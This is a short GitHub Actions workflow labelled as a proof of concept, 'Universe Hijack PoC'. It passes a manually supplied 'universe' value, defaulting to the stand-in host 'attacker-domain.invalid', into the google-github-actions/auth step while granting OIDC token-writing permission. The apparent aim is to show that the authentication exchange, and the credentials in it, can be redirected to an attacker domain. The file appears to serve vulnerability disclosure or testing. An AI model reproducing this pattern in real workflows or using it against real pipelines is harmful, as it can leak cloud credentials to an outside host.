name: Universe Hijack PoC

on:
  workflow_dispatch:
    inputs:
      universe_override:
        description: 'Attacker controlled universe value'
        required: true
        default: 'attacker-domain.invalid'

jobs:
  auth:
    runs-on: ubuntu-latest
    permissions:
      id-token: write # needed for OIDC
      contents: read
    steps:
      - id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456/locations/global/workloadIdentityPools/test-pool/providers/test-provider'
          service_account: 'test@test-project.iam.gserviceaccount.com'
          universe: ${{ github.event.inputs.universe_override }}

      - name: Report
        if: always()
        run: echo "Action completed"
